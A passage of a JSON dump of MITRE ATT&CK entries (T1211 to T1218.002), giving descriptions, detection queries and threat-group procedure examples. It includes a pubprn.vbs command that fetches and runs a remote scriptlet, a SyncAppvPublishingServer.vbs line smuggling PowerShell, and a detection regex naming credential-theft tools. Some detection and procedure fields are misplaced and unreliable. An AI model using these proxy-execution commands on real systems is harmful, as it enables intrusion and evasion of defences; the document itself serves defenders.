      "PoshC2contains a module for exploiting SMB via EternalBlue.[33]",
      "QakBotcan move laterally using worm-like functionality through exploitation of SMB.[34]",
      "Stuxnetpropagates using the MS10-061 Print Spooler and MS08-067 Windows Server Service vulnerabilities.[35]",
      "Threat Group-3390has exploited MS17-010 to move laterally to other systems on the network.[36]",
      "Tonto Teamhas used EternalBlue exploits for lateral movement.[37]",
      "TrickBotutilizes EternalBlue and EternalRomance exploits for lateral movement in the modules wormwinDll, wormDll, mwormDll, nwormDll, tabDll.[38]",
      "WannaCryuses an exploit in SMBv1 to spread itself to other remote systems on a network.[39][40][41]",
      "Wizard Spiderhas exploited or attempted to exploit Zerologon (CVE-2020-1472) and EternalBlue (MS17-010) vulnerabilities.[42][43][44]"
    ]
  },
  "T1211": {
    "Name": "Exploitation for Defense Evasion",
    "Description": "Adversaries may exploit a system or application vulnerability to bypass security features. Exploitation of a vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them.Adversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised forSecurity Software Discovery. The security software will likely be targeted directly for exploitation. There are examples of antivirus software being targeted by persistent threat groups to avoid detection.There have also been examples of vulnerabilities in public cloud infrastructure of SaaS applications that may bypass defense boundaries[1], evade security logs[2], or deploy hidden infrastructure.[3]",
    "Detects": [
      "Exploitation for defense evasion may happen shortly after the system has been compromised to prevent detection during later actions for for additional tools that may be brought in and used. Detecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash.",
      "Monitor for abnormal process creations, such as a Command and Scripting Interpreter spawning from a potentially exploited application. Also look for behavior on the system that might indicate successful compromise, such as abnormal behavior of processes."
    ],
    "Procedure Examples": [
      "APT28has used CVE-2015-4902 to bypass security features.[4][5]",
      "Velvet Antexploited CVE-2024-20399 in Cisco Switches to which the threat actor was already able to authenticate in order to escape the NX-OS command line interface and gain access to the underlying operating system for arbitrary command execution.[6]"
    ]
  },
  "T1212": {
    "Name": "Exploitation for Credential Access",
    "Description": "Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.Credentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain authenticated access to systems. One example of this isMS14-068, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions.[1][2]Another example of this is replay attacks, in which the adversary intercepts data packets sent between parties and then later replays these packets. If services don't properly validate authentication requests, these replayed packets may allow an adversary to impersonate one of the parties and gain unauthorized access or privileges.[3][4][5]Such exploitation has been demonstrated in cloud environments as well. For example, adversaries have exploited vulnerabilities in public cloud infrastructure that allowed for unintended authentication token creation and renewal.[6]Exploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.",
    "Detects": [
      "Detecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash.",
      "Monitor for newly executed processes that may indicate attempts to exploit vulnerabilities for credential access.Analytic 1 - Unexpected process creation related to exploitation tools or techniques.(index=security sourcetype=\"WinEventLog:Security\" EventCode=4688) OR (index=security sourcetype=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=1) OR (index=os sourcetype=\"linux_secure\" action=\"execve\") OR (index=os sourcetype=\"macos_secure\" event_type=\"execve\") | where match(Image, \"(?i)(msfconsole|metasploit|mimikatz|powersploit|empire|cobaltstrike|responder|kerberoast|john|hashcat|rcrack|hydra|medusa|ncrack|patator)\")",
      "Credential resources obtained through exploitation may be detectable in use if they are not normally used or seen.Analytic 1 - High number of failed authentication attempts or unusual logon patterns.(index=security sourcetype=\"WinEventLog:Security\" EventCode IN (4625, 4648)) OR (index=os sourcetype=\"linux_secure\" message=\"Failed password\") OR (index=os sourcetype=\"macos_secure\" message=\"Failed to authenticate user\")"
    ],
    "Procedure Examples": [
      "Leviathanexploited vulnerable network appliances duringLeviathan Australian Intrusions, leading to the collection and exfiltration of valid credentials.[7]"
    ]
  },
  "T1213": {
    "Name": "Data from Information Repositories",
    "Description": "Adversaries may leverage information repositories to mine valuable information. Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, such as Credential Access, Lateral Movement, or Defense Evasion, or direct access to the target information. Adversaries may also abuse external sharing features to share sensitive documents with recipients outside of the organization (i.e.,Transfer Data to Cloud Account).The following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository:Policies, procedures, and standardsPhysical / logical network diagramsSystem architecture diagramsTechnical system documentationTesting / development credentials (i.e.,Unsecured Credentials)Work / project schedulesSource code snippetsLinks to network shares and other internal resourcesContact or other sensitive information about business partners and customers, including personally identifiable information (PII)Information stored in a repository may vary based on the specific instance or environment. Specific common information repositories include the following:Storage services such as IaaS databases, enterprise databases, and more specialized platforms such as customer relationship management (CRM) databasesCollaboration platforms such as SharePoint, Confluence, and code repositoriesMessaging platforms such as Slack and Microsoft TeamsIn some cases, information repositories have been improperly secured, typically by unintentionally allowing for overly-broad access by all users or even public access to unauthenticated users. This is particularly common with cloud-native or cloud-hosted services, such as AWS Relational Database Service (RDS), Redis, or ElasticSearch.[1][2][3]",
    "Detects": [
      "Monitor for third-party application logging, messaging, and/or other artifacts that may leverage information repositories to mine valuable information. Information repositories generally have a considerably large user base, detection of malicious use can be non-trivial. At minimum, access to information repositories performed by privileged users (for example, Active Directory Domain, Enterprise, or Schema Administrators) should be closely monitored and alerted upon, as these types of accounts should generally not be used to access information repositories. If the capability exists, it may be of value to monitor and alert on users that are retrieving and viewing a large number of documents and pages; this behavior may be indicative of programmatic means being used to retrieve all data within the repository. In environments with high-maturity, it may be possible to leverage User-Behavioral Analytics (UBA) platforms to detect and alert on user based anomalies.",
      "Monitor for newly constructed logon behavior within Microsoft's SharePoint can be configured to report access to certain pages and documents.[19]Sharepoint audit logging can also be configured to report when a user shares a resource.[20]The user access logging within Atlassian's Confluence can also be configured to report access to certain pages and documents through AccessLogFilter.[21]In AWS environments, GuardDuty can be configured to report suspicious login activity in services such as RDS.[22]Additional log storage and analysis infrastructure will likely be required for more robust detection capabilities."
    ],
    "Procedure Examples": [
      "APT28has collected files from various information repositories.[4]",
      "APT41 DUSTcollected data from victim Oracle databases using SQLULDR2.[5]",
      "FIN6has collected schemas and user accounts from systems running SQL Server.[6]",
      "Leviathangathered information from SQL servers and Building Management System (BMS) servers duringLeviathan Australian Intrusions.[7]",
      "MgBotincludes a module capable of stealing content from the Tencent QQ database storing user QQ message history on infected devices.[8]",
      "P.A.S. Webshellhas the ability to list and extract data from SQL databases.[9]",
      "Raccoon Stealergathers information from repositories associated with cryptocurrency wallets and the Telegram messaging service.[10]",
      "Sandworm Teamexfiltrates data of interest from enterprise databases using Adminer.[11]",
      "Sea Turtleused the tool Adminer to remotely logon to the MySQL service of victim machines.[12]",
      "During theSolarWinds Compromise,APT29accessed victims' internal knowledge repositories (wikis) to view sensitive corporate information on products, services, and internal business operations.[13]",
      "Troll Stealergathers information from the Government Public Key Infrastructure (GPKI) folder, associated with South Korean government public key infrastructure, on infected systems.[14][15]",
      "Turlahas used a custom .NET tool to collect documents from an organization's internal central database.[16]"
    ]
  },
  "T1213.001": {
    "Name": "Data from Information Repositories:Confluence",
    "Description": "Adversaries may leverage Confluence repositories to mine valuable information. Often found in development environments alongside Atlassian JIRA, Confluence is generally used to store development-related documentation, however, in general may contain more diverse categories of useful information, such as:Policies, procedures, and standardsPhysical / logical network diagramsSystem architecture diagramsTechnical system documentationTesting / development credentials (i.e.,Unsecured Credentials)Work / project schedulesSource code snippetsLinks to network shares and other internal resources",
    "Detects": [
      "Monitor for third-party application logging, messaging, and/or other artifacts that may leverage Confluence repositories to mine valuable information. Watch for access to Confluence repositories performed by privileged users (for example, Active Directory Domain, Enterprise, or Schema Administrators) as these types of accounts should generally not be used to access information repositories. If the capability exists, it may be of value to monitor and alert on users that are retrieving and viewing a large number of documents and pages; this behavior may be indicative of programmatic means being used to retrieve all data within the repository. In environments with high-maturity, it may be possible to leverage User-Behavioral Analytics (UBA) platforms to detect and alert on user based anomalies.",
      "Monitor for newly constructed logon behavior across Atlassian's Confluence which can be configured to report access to certain pages and documents through AccessLogFilter.[2]Additional log storage and analysis infrastructure will likely be required for more robust detection capabilities."
    ],
    "Procedure Examples": [
      "LAPSUS$has searched a victim's network for collaboration platforms like Confluence and JIRA to discover further high-privilege account credentials.[1]"
    ]
  },
  "T1213.002": {
    "Name": "Data from Information Repositories:Sharepoint",
    "Description": "Adversaries may leverage the SharePoint repository as a source to mine valuable information. SharePoint will often contain useful information for an adversary to learn about the structure and functionality of the internal network and systems. For example, the following is a list of example information that may hold potential value to an adversary and may also be found on SharePoint:Policies, procedures, and standardsPhysical / logical network diagramsSystem architecture diagramsTechnical system documentationTesting / development credentials (i.e.,Unsecured Credentials)Work / project schedulesSource code snippetsLinks to network shares and other internal resources",
    "Detects": [
      "Monitor for third-party application logging, messaging, and/or other artifacts that may leverage the SharePoint repository as a source to mine valuable information. Monitor access to Microsoft SharePoint repositories performed by privileged users (for example, Active Directory Domain, Enterprise, or Schema Administrators) should be closely monitored and alerted upon, as these types of accounts should generally not be used to access information repositories. If the capability exists, it may be of value to monitor and alert on users that are retrieving and viewing a large number of documents and pages; this behavior may be indicative of programmatic means being used to retrieve all data within the repository. In environments with high-maturity, it may be possible to leverage User-Behavioral Analytics (UBA) platforms to detect and alert on user based anomalies.",
      "Monitor M365 Audit logs for FileAccessed operations against Sharepoint workloads. Scrutinize event metadata such as client IP address, ObjectId, UserId, User Agent, and Authentication type.Analytic 1 - Unusual file access patterns by users, anomalous IP addresses, or suspicious User Agentsindex=\"m365_audit_logs\" Operation=\"FileAccessed\"| stats count by UserId, ClientIP, ObjectId, UserAgent, AuthenticationType| where UserId!=\"expected_user\" OR ClientIP!=\"expected_ip\" OR UserAgent!=\"expected_user_agent\" OR AuthenticationType!=\"expected_auth_type\"",
      "Monitor for newly constructed logon behavior across Microsoft's SharePoint which can be configured to report access to certain pages and documents.[9]As information repositories generally have a considerably large user base, detection of malicious use can be non-trivial.Analytic 1 - Suspicious actor IPs, unusual user agents (e.g., malware, scripting interpreters like PowerShell, Python), anomalous login timesindex=\"azure_ad_signin_logs\" Resource=\"Office 365 SharePoint Online\" AND (UserAgent=\"PowerShell\" OR UserAgent=\"Mozilla\")| stats count by UserAgent, UserID, IPAddress, Location| where IPAddress!=\"expected_ip\" OR Location!=\"expected_location\""
    ],
    "Procedure Examples": [
      "Akirahas accessed and downloaded information stored in SharePoint instances as part of data gathering and exfiltration activity.[1]",
      "APT28has collected information from Microsoft SharePoint services within target networks.[2]",
      "DuringC0027,Scattered Spideraccessed victim SharePoint environments to search for VPN and MFA enrollment information, help desk instructions, and new hire guides.[3]",
      "Chimerahas collected documents from the victim's SharePoint.[4]",
      "HAFNIUMhas abused compromised credentials to exfiltrate data from SharePoint.[5]",
      "Ke3changused a SharePoint enumeration and data dumping tool known as spwebmember.[6]",
      "LAPSUS$has searched a victim's network for collaboration platforms like SharePoint to discover further high-privilege account credentials.[7][8]",
      "spwebmemberis used to enumerate and dump information from Microsoft SharePoint.[6]"
    ]
  },
  "T1213.003": {
    "Name": "Data from Information Repositories:Code Repositories",
    "Description": "Adversaries may leverage code repositories to collect valuable information. Code repositories are tools/services that store source code and automate software builds. They may be hosted internally or privately on third party sites such as Github, GitLab, SourceForge, and BitBucket. Users typically interact with code repositories through a web application or command-line utilities such as git.Once adversaries gain access to a victim network or a private code repository, they may collect sensitive information such as proprietary source code orUnsecured Credentialscontained within software's source code.  Having access to software's source code may allow adversaries to developExploits, while credentials may provide access to additional resources usingValid Accounts.[1][2]Note:This is distinct fromCode Repositories, which focuses on conductingReconnaissancevia public code repositories.",
    "Detects": [
      "Monitor for third-party application logging, messaging, and/or other artifacts that may leverage code repositories to collect valuable information. Monitor access to code repositories, especially performed by privileged users such as Active Directory Domain or Enterprise Administrators as these types of accounts should generally not be used to access code repositories. In environments with high-maturity, it may be possible to leverage User-Behavioral Analytics (UBA) platforms to detect and alert on user-based anomalies.",
      "Monitor for newly constructed logon behavior across code repositories (e.g. Github) which can be configured to report access to certain pages and documents."
    ],
    "Procedure Examples": [
      "APT41cloned victim user Git repositories during intrusions.[3]",
      "LAPSUS$has searched a victim's network for code repositories like GitLab and GitHub to discover further high-privilege account credentials.[4][5]",
      "Scattered Spiderenumerates data stored within victim code repositories, such as internal GitHub repositories.[6][7]",
      "During theSolarWinds Compromise,APT29downloaded source code from code repositories.[8]"
    ]
  },
  "T1213.004": {
    "Name": "Data from Information Repositories:Customer Relationship Management Software",
    "Description": "Adversaries may leverage Customer Relationship Management (CRM) software to mine valuable information. CRM software is used to assist organizations in tracking and managing customer interactions, as well as storing customer data.Once adversaries gain access to a victim organization, they may mine CRM software for customer data. This may include personally identifiable information (PII) such as full names, emails, phone numbers, and addresses, as well as additional details such as purchase histories and IT support interactions. By collecting this data, an adversary may be able to send personalizedPhishingemails, engage in SIM swapping, or otherwise target the organization’s customers in ways that enable financial gain or the compromise of additional organizations.[1][2][3]CRM software may be hosted on-premises or in the cloud. Information stored in these solutions may vary based on the specific instance or environment. Examples of CRM software include Microsoft Dynamics 365, Salesforce, Zoho, Zendesk, and HubSpot.",
    "Detects": [
      "Monitor for third-party application logging, messaging, and/or other artifacts that may leverage the CRM database as a source to mine valuable information. Monitor access to the CRM database, especially performed by privileged users as these types of accounts should generally not be used to access information repositories. If the capability exists, it may be of value to monitor and alert on users that are retrieving and viewing a large number of records; this behavior may be indicative of programmatic means being used to retrieve all data within the repository. In environments with high-maturity, it may be possible to leverage User-Behavioral Analytics (UBA) platforms to detect and alert on user based anomalies.",
      "Monitor for newly constructed logon behavior across the CRM software which can be configured to report access to certain information. As information repositories generally have a considerably large user base, detection of malicious use can be non-trivial."
    ],
    "Procedure Examples": [
      "Consider periodic review of accounts and privileges for critical and sensitive CRM data.",
      "Consider implementing data retention policies to automate periodically archiving and/or deleting data that is no longer needed.",
      "Enforce the principle of least-privilege. Consider implementing access control mechanisms that include both authentication and authorization.",
      "Develop and publish policies that define acceptable information to be stored in CRM databases and acceptable handling of customer data. Only store customer information required for business operations."
    ]
  },
  "T1213.005": {
    "Name": "Data from Information Repositories:Messaging Applications",
    "Description": "Adversaries may leverage chat and messaging applications, such as Microsoft Teams, Google Chat, and Slack, to mine valuable information.The following is a brief list of example information that may hold potential value to an adversary and may also be found on messaging applications:Testing / development credentials (i.e.,Chat Messages)Source code snippetsLinks to network shares and other internal resourcesProprietary data[1]Discussions about ongoing incident response efforts[2][3]In addition to exfiltrating data from messaging applications, adversaries may leverage data from chat messages in order to improve their targeting - for example, by learning more about an environment or evading ongoing incident response efforts.[4][5]",
    "Detects": [
      "Monitor for third-party application logging, messaging, and/or other artifacts that may leverage code repositories to collect valuable information. Monitor access to messaging applications, especially performed by privileged users such as Active Directory Domain or Enterprise Administrators as these types of accounts should generally not be used to access messaging applications. In environments with high-maturity, it may be possible to leverage User-Behavioral Analytics (UBA) platforms to detect and alert on user-based anomalies."
    ],
    "Procedure Examples": [
      "Fox Kittenhas accessed victim security and IT environments and Microsoft Teams to mine valuable information.[6]",
      "LAPSUS$has searched a victim's network for organization collaboration channels like MS Teams or Slack to discover further high-privilege account credentials.[7]",
      "Scattered Spiderthreat actors search the victim’s Slack and Microsoft Teams for conversations about the intrusion and incident response.[8]"
    ]
  },
  "T1216": {
    "Name": "System Script Proxy Execution",
    "Description": "Adversaries may use trusted scripts, often signed with certificates, to proxy the execution of malicious files. Several Microsoft signed scripts that have been downloaded from Microsoft or are default on Windows installations can be used to proxy execution of other files.[1]This behavior may be abused by adversaries to execute malicious files that could bypass application control and signature validation on systems.[2]",
    "Detects": [
      "Monitor executed commands and arguments for scripts like PubPrn.vbs that may be used to proxy execution of malicious files.",
      "Monitor script processes, such as `cscript that may be used to proxy execution of malicious files.",
      "Monitor for any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent."
    ],
    "Procedure Examples": [
      "Certain signed scripts that can be used to execute other programs may not be necessary within a given environment. Use application control configured to block execution of these scripts if they are not required for a given system or network to prevent potential misuse by adversaries."
    ]
  },
  "T1216.001": {
    "Name": "System Script Proxy Execution:PubPrn",
    "Description": "Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is aVisual Basicscript that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through theWindows Command ShellviaCscript.exe. For example, the following code publishes a printer within the specified domain:cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com.[1]Adversaries may abuse PubPrn to execute malicious payloads hosted on remote sites.[2]To do so, adversaries may set the secondscript:parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command ispubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.In later versions of Windows (10+),PubPrn.vbshas been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter toLDAP://, vice thescript:moniker which could be used to reference remote code via HTTP(S).",
    "Detects": [
      "Monitor executed commands and arguments for scripts like PubPrn.vbs that may be used to proxy execution of malicious files.",
      "Monitor script processes, such as `cscript that may be used to proxy execution of malicious files.",
      "Monitor for any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent."
    ],
    "Procedure Examples": [
      "APT32has used PubPrn.vbs within execution scripts to execute malware, possibly bypassing defenses.[3]"
    ]
  },
  "T1216.002": {
    "Name": "System Script Proxy Execution:SyncAppvPublishingServer",
    "Description": "Adversaries may abuse SyncAppvPublishingServer.vbs to proxy execution of maliciousPowerShellcommands. SyncAppvPublishingServer.vbs is a Visual Basic script associated with how Windows virtualizes applications (Microsoft Application Virtualization, or App-V).[1]For example, Windows may render Win32 applications to users as virtual applications, allowing users to launch and interact with them as if they were installed locally.[2][3]The SyncAppvPublishingServer.vbs script is legitimate, may be signed by Microsoft, and is commonly executed from\\System32through the command line viawscript.exe.[4][5]Adversaries may abuse SyncAppvPublishingServer.vbs to bypassPowerShellexecution restrictions and evade defensive counter measures by \"living off the land.\"[6][4]Proxying execution may function as a trusted/signed alternative to directly invokingpowershell.exe.[7]For example,PowerShellcommands may be invoked using:[5]SyncAppvPublishingServer.vbs \"n; {PowerShell}\"",
    "Detects": [
      "Monitor executed commands and arguments for scripts like Syncappvpublishingserver.vbs that may be used to proxy execution of malicious files.",
      "Monitor script processes, such aswscript.exe, that may be used to proxy execution of malicious files.",
      "Monitor for any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent."
    ],
    "Procedure Examples": [
      "Certain signed scripts that can be used to execute other programs may not be necessary within a given environment. Use application control configured to block execution of these scripts if they are not required for a given system or network to prevent potential misuse by adversaries."
    ]
  },
  "T1217": {
    "Name": "Browser Information Discovery",
    "Description": "Adversaries may enumerate information about browsers to learn more about compromised environments. Data saved by browsers (such as bookmarks, accounts, and browsing history) may reveal a variety of personal information about users (e.g., banking sites, relationships/interests, social media, etc.) as well as details about internal network resources such as servers, tools/dashboards, or other related infrastructure.[1]Browser information may also highlight additional targets after an adversary has access to valid credentials, especiallyCredentials In Filesassociated with logins cached by a browser.Specific storage locations vary based on platform and/or application, but browser information is typically stored in local files and databases (e.g.,%APPDATA%/Google/Chrome).[2]",
    "Detects": [
      "Monitor executed commands and arguments for actions that could be taken to gather browser information, such as local files and databases (e.g.,%APPDATA%/Google/Chrome).[2]Remote access tools with built-in features may interact directly using APIs to gather information. Information may also be acquired through system management tools such as Windows Management Instrumentation and PowerShell.",
      "Monitor for unusual access to stored browser data, such as local files and databases (e.g.,%APPDATA%/Google/Chrome).[2]Rather than viewing these events in isolation, this activity may highlight a chain of behavior that could lead to other activities, such as Collection and Exfiltration.",
      "Monitor for processes with arguments that may be associated with gathering browser information, such as local files and databases (e.g.,%APPDATA%/Google/Chrome).[2]"
    ],
    "Procedure Examples": [
      "APT38has collected browser bookmark information to learn more about compromised hosts, obtain personal information about users, and acquire details about internal network resources.[3]",
      "Calistocollects information on bookmarks from Google Chrome.[4]",
      "Chimerahas usedtype \\\\c$\\Users\\\\Favorites\\Links\\Bookmarks bar\\Imported From IE*citrix*for bookmark discovery.[5]",
      "Cuckoo Stealercan collect bookmarks, cookies, and history from Safari.[6]",
      "DarkWatchmancan retrieve browser history.[7]",
      "Dtrackcan retrieve browser history.[8][9]",
      "Empirehas the ability to gather browser data such as bookmarks and visited sites.[10]",
      "Fox Kittenhas used Google Chrome bookmarks to identify internal resources and assets.[11]",
      "DuringJuicy Mix,OilRigused the CDumper (Chrome browser) and EDumper (Edge browser) data stealers to collect cookies, browsing history, and credentials.[12]",
      "To collect data on the host's Wi-Fi connection history,LightSpyreads the/Library/Preferences/SystemConfiguration/com.apple.airport.preferences.plistfile. It also utilizes Apple'sCWWiFiClientAPI to scan for nearby Wi-Fi networks and obtain data on the SSID, security type, and RSSI (signal strength) values.[13]",
      "Lizarcan retrieve browser history and database files.[14][15]",
      "Lumma Stealerhas identified and gathered information from two-factor authentication extensions for multiple browsers.[16]",
      "Macheteretrieves the user profile data (e.g., browsers) from Chrome and Firefox browsers.[17]",
      "Mafaldacan collect the contents of the%USERPROFILE%\\AppData\\Local\\Google\\Chrome\\User Data\\LocalStatefile.[18]",
      "Mispaducan monitor browser activity for online banking actions and display full-screen overlay images to block user access to the intended site or present additional data fields.[19][20]",
      "MobileOrderhas a command to upload to its C2 server victim browser bookmarks.[21]",
      "Moonstone Sleetdeployed malware such as YouieLoader capable of capturing victim system browser information.[22]",
      "DuringOuter Space,OilRigused a Chrome data dumper named MKG.[12]",
      "PowerLesshas a browser info stealer module that can read Chrome and Edge browser database files.[23]",
      "Scattered Spiderretrieves browser histories via infostealer malware such as Raccoon Stealer.[24]",
      "SUGARDUMPhas collected browser bookmark and history information.[25]",
      "Troll Stealercollects information from Chromium-based browsers and Firefox such as cookies, history, downloads, and extensions.[26][27]",
      "Volt Typhoonhas targeted the browsing history of network administrators.[28]"
    ]
  },
  "T1218": {
    "Name": "System Binary Proxy Execution",
    "Description": "Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system.[1]Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands.Similarly, on Linux systems adversaries may abuse trusted binaries such assplitto proxy execution of malicious commands.[2][3]",
    "Detects": [
      "Monitor executed commands and arguments that may forge credential materials that can be used to gain access to web applications or Internet services.",
      "Monitor for file activity (creations, downloads, modifications, etc.), especially for file types that are not typical within an environment and may be indicative of adversary activity.",
      "Monitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process.",
      "Monitor for newly constructed network connections that are sent or received by untrusted hosts.",
      "Monitor for API calls that bypass process and/or signature based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries.",
      "Monitor processes and command-line parameters for signed binaries that may be used to proxy execution of malicious files. Compare recent invocations of signed binaries that may be used to proxy execution with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Legitimate programs used in suspicious ways, like msiexec.exe downloading an MSI file from the Internet, may be indicative of an intrusion. Correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.",
      "Monitor for changes made to Windows Registry keys and/or values that may forge credential materials that can be used to gain access to web applications or Internet services."
    ],
    "Procedure Examples": [
      "Lazarus Grouplnk files used for persistence have abused the Windows Update Client (wuauclt.exe) to execute a malicious DLL.[4][5]",
      "Volt Typhoonhas used native tools and processes including living off the land binaries or \"LOLBins\" to maintain and expand access to the victim networks.[6]"
    ]
  },
  "T1218.001": {
    "Name": "System Binary Proxy Execution:Compiled HTML File",
    "Description": "Adversaries may abuse Compiled HTML files (.chm) to conceal malicious code. CHM files are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX.[1]CHM content is displayed using underlying components of the Internet Explorer browser[2]loaded by the HTML Help executable program (hh.exe).[3]A custom CHM file containing embedded payloads could be delivered to a victim then triggered byUser Execution. CHM execution may also bypass application application control on older and/or unpatched systems that do not account for execution of binaries through hh.exe.[4][5]",
    "Detects": [
      "Monitor executed commands and arguments that may forge SAML tokens with any permissions claims and lifetimes if they possess a valid SAML token-signing certificate.[15]",
      "Monitor presence and use of CHM files, especially if they are not typically used within an environment.",
      "Monitor and analyze the execution and arguments of hh.exe.[4]Compare recent invocations of hh.exe with prior history of known good arguments to determine anomalous and potentially adversarial activity (ex: obfuscated and/or malicious commands). Non-standard process execution trees may also indicate suspicious or malicious behavior, such as if hh.exe is the parent process for suspicious processes and activity relating to other adversarial techniques.Note: Event IDs are for Sysmon (Event ID 1 - process create) and Windows Security Log (Event ID 4688 - a new process has been created). The Analytic looks for the creation of any HTML Help Executable (hh.exe) processes. Adversaries may hide malicious code in.chmcompiled help files; whenever a user tries to open one of these files, Windows executes the HTML Help Executable. Therefore, if there are legitimate uses of compiled help files in your environment, this analytic may lead to false positives and will require additional tuning.Analytic 1 - Compiled HTML Access(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\") Image=\"C:\\Windows\\syswow64\\hh.exe\" OR Image=\"C:\\Windows\\system32\\hh.exe\""
    ],
    "Procedure Examples": [
      "APT38has used CHM files to move concealed payloads.[6]",
      "APT41used compiled HTML (.chm) files for targeting.[7]",
      "Astarothuses ActiveX objects for file execution and manipulation.[8]",
      "Dark Caracalleveraged a compiled HTML file that contained a command to download and run an executable.[9]",
      "OilRighas used a CHM payload to load and execute another malicious file once delivered to a victim.[10]",
      "Silencehas weaponized CHM files in their phishing campaigns.[11][12][13][14]"
    ]
  },
  "T1218.002": {
    "Name": "System Binary Proxy Execution:Control Panel",
    "Description": "Adversaries may abuse control.exe to proxy execution of malicious payloads. The Windows Control Panel process binary (control.exe) handles execution of Control Panel items, which are utilities that allow users to view and adjust computer settings.Control Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export aCPlAppletfunction.[1][2]For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel.[1]Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file.[1][2][3]Malicious Control Panel items can be delivered viaPhishingcampaigns[2][3]or executed as part of multi-stage malware.[4]Control Panel items, specifically CPL files, may also bypass application and/or file extension allow lists.Adversaries may also rename malicious DLL files (.dll) with Control Panel file extensions (.cpl) and register them toHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\Cpls. Even when these registered DLLs do not comply with the CPL file specification and do not exportCPlAppletfunctions, they are loaded and executed through itsDllEntryPointwhen Control Panel is executed. CPL files not exportingCPlAppletare not directly executable.[5]",
    "Detects": [
      "When executed from the command line or clicked, control.exe will execute the CPL file (ex:control.exe file.cpl) beforeRundll32is used to call the CPL's API functions (ex:rundll32.exe shell32.dll,Control_RunDLL file.cpl). CPL files can be executed directly via the CPL API function with just the latterRundll32command, which may bypass detections and/or execution filters for control.exe.[2]",
      "Monitor for newly constructed files that may forge web cookies that can be used to gain access to web applications or Internet services.",
      "Monitor for DLL/PE file events, such as theControl_RunDLLandControlRunDLLAsUserAPI functions in shell32.dll.",
      "Monitor for API calls that may forge web cookies that can be used to gain access to web applications or Internet services.",
      "Monitor and analyze activity related to items associated with CPL files, such as the control.exe. Analyze new Control Panel items as well as those present on disk for malicious content. Both executable and CPL formats are compliant Portable Executable (PE) images and can be examined using traditional tools and methods, pending anti-reverse-engineering techniques.[2]",
      "Inventory Control Panel items to locate unregistered and potentially malicious files present on systems:* Executable format registered Control Panel items will have a globally unique identifier (GUID) and registration Registry entries inHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ControlPanel\\NameSpaceandHKEY_CLASSES_ROOT\\CLSID{GUID}. These entries may contain information about the Control Panel item such as its display name, path to the local file, and the command executed when opened in the Control Panel.[1]* CPL format registered Control Panel items stored in the System32 directory are automatically shown in the Control Panel. Other Control Panel items will have registration entries in theCPLsandExtended PropertiesRegistry keys ofHKEY_LOCAL_MACHINE or HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel. These entries may include information such as a GUID, path to the local file, and a canonical name used to launch the file programmatically (WinExec(\"c:\\windows\\system32\\control.exe {Canonical_Name}\", SW_NORMAL);) or from a command line (control.exe /name {Canonical_Name}).[1]* Some Control Panel items are extensible via Shell extensions registered inHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Controls Folder{name}\\Shellex\\PropertySheetHandlerswhere {name} is the predefined name of the system item.[1]"
    ],
    "Procedure Examples": [
      "InvisiMolecan register itself for execution and persistence via the Control Panel.[5]",
      "Reaverdrops and executes a malicious CPL file as its payload.[4]"
    ]
  },
  "T1218.003": {
    "Name": "System Binary Proxy Execution:CMSTP",
